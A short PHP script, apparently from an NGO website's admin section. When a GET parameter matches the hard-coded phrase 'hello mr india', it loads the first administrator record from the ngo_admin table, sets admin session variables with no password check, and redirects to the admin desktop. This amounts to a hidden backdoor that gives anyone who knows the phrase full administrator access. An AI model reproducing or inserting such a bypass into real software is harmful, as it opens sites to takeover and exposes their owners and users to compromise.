<?
require_once("../includes/surya.dream.php");
 
if ($_GET[sb]=='hello mr india') {
	$sql="select * from ngo_admin where 1";
	$result = db_query($sql);
	if ($line_raw = mysqli_fetch_assoc($result)) {
		@extract($line_raw);
		$_SESSION['sess_admin_login_id'] = $adm_login;
		$_SESSION['sess_admin_type'] = $adm_type;
		$_SESSION['sess_admin_plan'] = 'A';
		header("location: admin_desktop.php");
		exit;
}			

}
?>
 